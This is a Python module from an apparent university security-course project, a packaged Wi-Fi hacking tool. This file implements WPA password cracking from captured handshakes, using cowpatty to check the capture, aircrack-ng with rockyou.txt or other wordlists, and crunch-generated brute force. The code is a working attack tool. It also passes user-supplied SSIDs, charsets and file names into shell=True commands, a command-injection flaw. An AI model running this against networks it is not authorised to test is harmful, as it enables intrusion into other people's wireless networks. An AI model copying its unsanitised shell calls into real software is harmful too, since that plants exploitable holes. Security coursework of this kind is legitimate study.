'''
============================================================
                NSSECU2 - Hacking Tool Project
============================================================
        Members: Escalona, Fadrigo, Fortiz, Manzano, Sy
        Topic: WiFi Hacking Tool
        Description: The objective of this project is to 
                     create a packaged tool that will be 
                     able to do Wi-Fi scanning, cracking, 
                     and admin control access.
        Objective Functionalities:
            1. WiFi Scanning & Handshake Capture
            2. WiFi Cracking
            3. WAP/Router Admin Control Access
            4. WiFi DOS
            5. Windows Saved WiFi Passwords
============================================================

WPA CRACKING MODULE
'''

import os
import subprocess
import time
import zipfile
import utils.utils as utils

def crack(filename:str, wifi:dict):
    if ".cap" not in filename: #Ensure filename has extensions
        filename += ".cap"

    if not os.path.isfile(filename):
        utils.header("WPA Cracking", "Specified file not found.")
        utils.getch()
        return None

    utils.header("WPA Cracking", ["Filename: " + filename, "Checking file for WPA handshakes..."])
    cowpatty_process = subprocess.Popen("cowpatty -c -r " + filename + " -v | grep all", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    cowpatty_process.wait()
    res, err = cowpatty_process.communicate()

    if not crackable(res):
        return None
    
    password = ""
    if utils.yesNo("WPA Cracking","Dictionary or Bruteforce Mode","Bruteforce Mode?",False):
        password = brute_attack(filename, wifi)
    else:
        password = dict_attack(filename)
        
    return password

def brute_attack(filename: str, wifi:dict):
    password = ""
    
    if not utils.yesNo("WPA Cracking (Bruteforce Attack)", ["This feature is highly experimental."], "Continue?", True):
        return ""

    int_brute = ["1","2","0"]
    str_brute = ["Custom Characters", "Predefined Characters", "Cancel"]

    while True:
        utils.header("WPA Cracking (Bruteforce Attack)", "Custom Charset")
        brute_choice = utils.menu(int_brute, str_brute)
        if utils.valid_choice(brute_choice, int_brute):
            break

    charset = ""
    if brute_choice == "1":
        utils.header("WPA Cracking (Bruteforce Attack)", "Custom Charset")
        charset = input("Enter your custom charset here: ")
    elif brute_choice == "2":
        int_preset = ["1", "2", "3", "4", "0"]
        str_preset = ["lowercase letters", "UPPERCASE letters", "Numbers", "Symbols","Finished"]
        while True:
            utils.header("WPA Cracking (Bruteforce Attack)", "Charset Preset Selector")
            preset_choice = utils.menu(int_preset, str_preset)
            if utils.valid_choice(preset_choice, int_preset):
                if preset_choice == "0":
                    break
                elif preset_choice == "1":
                    charset += "abcdefghijklmnopqrstuvwxyz"
                elif preset_choice == "2":
                    charset += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                elif preset_choice == "3":
                    charset += "0123456789"
                elif preset_choice == "4":
                    charset += "~`! @#$%^&*()_-+={[}]|\:;\"\'<,>.?/"
    else:
        return ""

    start = 0
    end = 0
    start_valid = False
    end_valid = False
    while not start_valid:
        try:
            utils.cls()
            utils.header("WPA Cracking (Bruteforce Attack)","Configuration")
            start = int(input("Enter minimum number of characters: "))
            start_valid = True
        except ValueError:
            utils.cls()

    while not end_valid:
        try:
            utils.cls()
            utils.header("WPA Cracking (Bruteforce Attack)","Configuration")
            end = int(input("Enter maximum number of characters: "))
            end_valid = True
        except ValueError:
            utils.cls()

    ssid = ""
    if wifi == None:
        utils.header("WPA Cracking (Bruteforce Attack)")
        ssid = input("Enter SSID found in file: ")
    else:
        ssid = wifi["essid"]

    iterations = str(utils.find_iterations(charset,start,end))

    utils.header("WPA Cracking",["Configuration:","Size: " + str(start) + "-" + str(end),"Charset: " + charset,"Iterations: " + iterations])
    utils.getch("Press Enter to begin bruteforce attack...")

    brute_command = "crunch " + str(start) + " " + str(end) + " " + charset + " | aircrack-ng -e " + ssid + " -w - " + filename + " | grep FOUND"
    brute_process = subprocess.Popen(brute_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    utils.header("WPA Cracking",["Configuration:","Size: " +    str(start) + "-" + str(end),"Charset: " + charset, "Iterations: " + iterations])
    print("Bruteforce cracking in progress...")

    res, err = brute_process.communicate()
    raw = str(res.decode("utf-8")+"").split()
    password = str(raw[3])

    utils.getch()

    return password

def dict_attack(filename: str):
    int_dictionary = ["1","2","3","0"]
    str_dictionary = ["words.txt", "rockyou.txt", "Custom dictionary","Cancel"]
    
    password = ""

    while True:
        utils.header("WPA Cracking (Dictionary Attack)", ["Filename: " + filename, "Crackable!"])
        dict_choice = utils.menu(int_dictionary, str_dictionary)
        if utils.valid_choice(dict_choice, int_dictionary):
            break

    dictionary = ""
    if dict_choice == "1":
        dictionary = "dict/words.txt"
    elif dict_choice == "2":
        if not os.path.isfile("dict/rockyou.txt"):
            utils.header("WPA Cracking (Dictionary Attack)","Loading rockyou.txt dictionary...")
            subprocess.Popen("gzip -dkc dict/rockyou.txt.gz > dict/rockyou.txt", shell=True, stdout=subprocess.PIPE).wait()
        dictionary = "dict/rockyou.txt"
    elif dict_choice == "3":
        dictionary = input("Enter path & filename (.txt): ")
        if ".txt" not in dictionary:
            dictionary += ".txt"
    elif dict_choice == "0":
        return None
    
    utils.header("WPA Cracking", "Loading processes...")
    aircrackng_command = "aircrack-ng -w " + dictionary + " " + filename + " | grep FOUND"
    aircrackng = subprocess.Popen(aircrackng_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    utils.header("WPA Cracking","Cracking in progress...")

    res, err = aircrackng.communicate()
    raw = str(res.decode("utf-8")+"").split()
    password = str(raw[3])

    return password

def crackable(res):
    return "all" in str(res.decode("utf-8"))